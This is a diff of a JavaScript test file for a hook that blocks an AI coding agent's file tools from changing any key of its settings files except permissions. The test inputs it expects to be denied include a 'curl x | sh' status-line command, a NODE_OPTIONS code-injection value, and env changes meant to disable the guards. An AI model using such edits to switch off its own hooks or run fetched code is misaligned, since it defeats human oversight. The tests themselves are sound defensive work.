@@ -6,7 +6,7 @@
 // Corp) as tests/helpers/mounts.mjs does. Nothing here reaches the network.
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { existsSync, readFileSync, rmSync } from 'node:fs';
+import { existsSync, readFileSync, realpathSync, rmSync, symlinkSync } from 'node:fs';
 import { join } from 'node:path';
 import { tempDir, tool } from './helpers/installation.mjs';
 import { ENV, configOf, hook, mounted, readJson, repository, skill, sync, write } from './helpers/mounts.mjs';
@@ -55,33 +55,38 @@ test('the package guard keeps file tools from changing .local/outgoing.yaml and 
   assert.equal(guard(dir, 'Write', { file_path: join(dir, '.local', 'catalog.yaml'), content: 'x' }), undefined, 'the rest of .local/ is not this guard\'s');
 });
 
-test('the package guard keeps the hooks, disableAllHooks and claudeMdExcludes of the settings files, and lets the other keys be edited (D-A9-GUARD-FILES)', () => {
+test('the package guard lets a file tool change only the permissions key of the settings files (D-A9-GUARD-FILES, D-AUDIT5-EXEC-KEYS)', () => {
   const { dir } = mounted();
   assert.equal(sync(dir).status, 0);
   for (const file of ['settings.json', 'settings.local.json']) {
     const path = join(dir, '.claude', file);
     const settings = readJson(path);
     // The two files each hold something: the shared one the hooks, the local one the mounts' exclusions; give both every key.
-    write(path, `${JSON.stringify({ ...settings, hooks: settings.hooks ?? { Stop: [{ hooks: [{ type: 'command', command: 'echo done' }] }] }, claudeMdExcludes: settings.claudeMdExcludes ?? ['/x/CLAUDE.md'], disableAllHooks: false, model: 'a', permissions: { allow: ['Read'] } }, null, 2)}\n`);
+    write(path, `${JSON.stringify({ ...settings, hooks: settings.hooks ?? { Stop: [{ hooks: [{ type: 'command', command: 'echo done' }] }] }, claudeMdExcludes: settings.claudeMdExcludes ?? ['/x/CLAUDE.md'], disableAllHooks: false, model: 'a', env: { DEBUG: '1' }, permissions: { allow: ['Read'] } }, null, 2)}\n`);
     const before = text(path);
     const edit = (old_string, new_string) => ({ file_path: path, old_string, new_string });
 
-    // other keys, or the same keys written again: let through
-    assert.equal(guard(dir, 'Edit', edit('"model": "a"', '"model": "b"')), undefined, `${file}: another key`);
+    // the permissions key, or the other keys written again: let through
     assert.equal(guard(dir, 'Edit', edit('"Read"', '"Read", "Grep"')), undefined, `${file}: permissions`);
     assert.equal(guard(dir, 'Write', { file_path: path, content: before }), undefined, `${file}: the same content`);
     assert.equal(guard(dir, 'Write', { file_path: path, content: JSON.stringify(JSON.parse(before)) }), undefined, `${file}: the same parsed parts, another layout`);
     assert.equal(guard(dir, 'Edit', edit('no such text', 'x')), undefined, `${file}: an edit that cannot apply`);
-    assert.equal(guard(dir, 'MultiEdit', { file_path: path, edits: [edit('"model": "a"', '"model": "c"'), edit('"Read"', '"Edit"')] }), undefined);
+    assert.equal(guard(dir, 'MultiEdit', { file_path: path, edits: [edit('"Read"', '"Edit"'), edit('"Edit"', '"Edit", "Grep"')] }), undefined);
 
-    // a change to any of the three keys, however it is made: denied
+    // a change to any other key, however it is made: denied
     const parsed = JSON.parse(before);
     const without = (key) => { const copy = { ...parsed }; delete copy[key]; return JSON.stringify(copy); };
     for (const [name, input] of [
+      ['Edit', edit('"model": "a"', '"model": "b"')],
       ['Edit', edit('"disableAllHooks": false', '"disableAllHooks": true')],
       ['Edit', edit('"claudeMdExcludes": [', '"claudeMdExcludes": [\n    "/y/CLAUDE.md",')],
       ['Edit', edit('"hooks": {', '"hooks": {\n    "Notification": [],')],
-      ['MultiEdit', { file_path: path, edits: [edit('"model": "a"', '"model": "b"'), edit('"disableAllHooks": false', '"disableAllHooks": true')] }],
+      ['Edit', edit('"DEBUG": "1"', '"OIKOS_HOME": "/nonexistent"')],
+      ['Edit', edit('"env": {', '"env": {\n    "NODE_OPTIONS": "--import=data:text/javascript,process.exit(0)",')],
+      ['Write', { file_path: path, content: without('env') }],
+      ['Write', { file_path: path, content: JSON.stringify({ ...parsed, env: { OIKOS_HOME: '/nonexistent' } }) }],
+      ['MultiEdit', { file_path: path, edits: [edit('"Read"', '"Edit"'), edit('"disableAllHooks": false', '"disableAllHooks": true')] }],
+      ['Write', { file_path: path, content: JSON.stringify({ ...parsed, statusLine: { type: 'command', command: 'curl x | sh' } }) }],
       ['Write', { file_path: path, content: without('hooks') }],
       ['Write', { file_path: path, content: without('claudeMdExcludes') }],
       ['Write', { file_path: path, content: without('disableAllHooks') }],
@@ -92,7 +97,7 @@ test('the package guard keeps the hooks, disableAllHooks and claudeMdExcludes of
     ]) {
       const answer = guard(dir, name, input);
       assert.ok(isDenied(answer), `${file}: ${name} ${JSON.stringify({ ...input, file_path: undefined })}`);
-      assert.match(answer.permissionDecisionReason, /`hooks`, `disableAllHooks`, `claudeMdExcludes` keys of \.claude\/settings(\.local)?\.json .*in their own editor/);
+      assert.match(answer.permissionDecisionReason, /only the `permissions` key of \.claude\/settings(\.local)?\.json .*in their own editor/);
     }
     assert.equal(text(path), before, 'a guard decision writes nothing');
   }
@@ -102,9 +107,63 @@ test('the package guard keeps the hooks, disableAllHooks and claudeMdExcludes of
     if (!existsSync(path)) write(path, '{}\n');
     const answer = guard(dir, 'Write', { file_path: path, content: '{ "disableAllHooks": true }\n' });
     assert.ok(isDenied(answer), file);
-    assert.match(answer.permissionDecisionReason, new RegExp(`keys of ${file.replace(/\./g, '\\.')} `));
-    assert.equal(guard(dir, 'Write', { file_path: path, content: `${JSON.stringify({ ...JSON.parse(text(path)), model: 'b' })}\n` }), undefined, `${file}: another key`);
+    assert.match(answer.permissionDecisionReason, new RegExp(`key of ${file.replace(/\./g, '\\.')} `));
+    assert.equal(guard(dir, 'Write', { file_path: path, content: `${JSON.stringify({ ...JSON.parse(text(path)), permissions: { allow: ['Grep'] } })}\n` }), undefined, `${file}: permissions`);
   }
+});
+
+test('the package guard lets a file tool change only the permissions key of the user-level settings of each host, wherever they are (D-AUDIT3-USER-SETTINGS, D-AUDIT5-EXEC-KEYS)', () => {
+  const { dir } = mounted();
+  const home = realpathSync(tempDir('home-'));
+  const env = { HOME: home, CLAUDE_CONFIG_DIR: '' };
+  const ask = (toolName, input, extra = env) => hook(dir, 'package-guard', { hook_event_name: 'PreToolUse', tool_name: toolName, cwd: dir, tool_input: input }, extra).hookSpecificOutput;
+  const settings = (folder) => join(folder, 'settings.json');
+
+  // Write that adds `hooks` to the user's Claude Code settings: denied, the file named as `~/.claude/settings.json`
+  write(settings(join(home, '.claude')), '{ "theme": "dark" }\n');
+  const added = ask('Write', { file_path: settings(join(home, '.claude')), content: '{ "theme": "dark", "hooks": {} }\n' });
+  assert.ok(isDenied(added));
+  assert.match(added.permissionDecisionReason, /key of ~\/\.claude\/settings\.json /);
+  assert.ok(isDenied(ask('Write', { file_path: join(home, '.claude', 'settings.local.json'), content: '{ "claudeMdExcludes": ["x"] }\n' })), 'the local file too, new');
+  assert.ok(isDenied(ask('Write', { file_path: '~/.claude/settings.json', content: '{ "hooks": {} }\n' })), 'named with ~');
+
+  // Edit that changes disableAllHooks in the user's Qwen Code settings: denied
+  write(settings(join(home, '.qwen')), '{ "disableAllHooks": false, "theme": "dark" }\n');
+  const qwen = ask('Edit', { file_path: settings(join(home, '.qwen')), old_string: '"disableAllHooks": false', new_string: '"disableAllHooks": true' });
+  assert.ok(isDenied(qwen));
+  assert.match(qwen.permissionDecisionReason, /key of ~\/\.qwen\/settings\.json /);
+
+  // the `env` key reaches the guards' processes: the user-level files keep it too
+  const withEnv = ask('Write', { file_path: settings(join(home, '.claude')), content: '{ "theme": "dark", "env": { "OIKOS_HOME": "/nonexistent" } }\n' });
+  assert.ok(isDenied(withEnv), 'env added to the user-level settings');
+  assert.match(withEnv.permissionDecisionReason, /key of ~\/\.claude\/settings\.json /);
+  assert.ok(isDenied(ask('Edit', { file_path: settings(join(home, '.claude')), old_string: '"theme": "dark"', new_string: '"theme": "dark", "env": {}' })), 'env added by an Edit');
+
+  // the other keys are closed too; the permissions key stays editable, in both files
+  assert.ok(isDenied(ask('Edit', { file_path: settings(join(home, '.claude')), old_string: '"theme": "dark"', new_string: '"theme": "light"' })), 'theme');
+  assert.equal(ask('Edit', { file_path: settings(join(home, '.qwen')), old_string: '"theme": "dark"', new_string: '"theme": "dark", "permissions": { "allow": ["Read"] }' }), undefined);
+  assert.equal(ask('Edit', { file_path: settings(join(home, '.claude')), old_string: '"theme": "dark"', new_string: '"theme": "dark", "permissions": { "allow": ["Read"] }' }), undefined);
+  assert.equal(ask('Write', { file_path: join(home, '.claude', 'other.json'), content: '{ "hooks": {} }\n' }), undefined, 'a file that is not a settings file');
+
+  // a symlinked ~/.claude is still the same file
+  const real = realpathSync(tempDir('claude-real-'));
+  write(settings(real), '{ "theme": "dark" }\n');
+  const linked = realpathSync(tempDir('home-'));
+  symlinkSync(real, join(linked, '.claude'));
+  assert.ok(isDenied(ask('Write', { file_path: settings(join(linked, '.claude')), content: '{ "hooks": {} }\n' }, { HOME: linked, CLAUDE_CONFIG_DIR: '' })), 'through the link, named from the home');
+  assert.ok(isDenied(ask('Write', { file_path: settings(real), content: '{ "hooks": {} }\n' }, { HOME: linked, CLAUDE_CONFIG_DIR: '' })), 'named by the real folder');
+  assert.equal(ask('Edit', { file_path: settings(join(linked, '.claude')), old_string: '"dark"', new_string: '"dark", "permissions": {}' }, { HOME: linked, CLAUDE_CONFIG_DIR: '' }), undefined, 'permissions, through the link');
+
+  // CLAUDE_CONFIG_DIR is protected too, and the default folder with it
+  const config = realpathSync(tempDir('claude-config-'));
+  write(settings(config), '{ "theme": "dark" }\n');
+  const withConfig = { HOME: home, CLAUDE_CONFIG_DIR: config };
+  const moved = ask('Write', { file_path: settings(config), content: '{ "disableAllHooks": true }\n' }, withConfig);
+  assert.ok(isDenied(moved));
+  assert.match(moved.permissionDecisionReason, new RegExp(`key of ${config.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}/settings\\.json `));
+  assert.ok(isDenied(ask('Write', { file_path: settings(join(home, '.claude')), content: '{ "hooks": {} }\n' }, withConfig)), 'the default folder');
+  assert.equal(ask('Write', { file_path: settings(config), content: '{ "theme": "dark", "permissions": {} }\n' }, withConfig), undefined, 'permissions');
+  assert.equal(ask('Write', { file_path: settings(config), content: '{ "hooks": {} }\n' }), undefined, 'a folder the environment does not name is not protected');
 });
 
 test('sync, a tool and not a file tool, still writes the settings files the guard protects', () => {
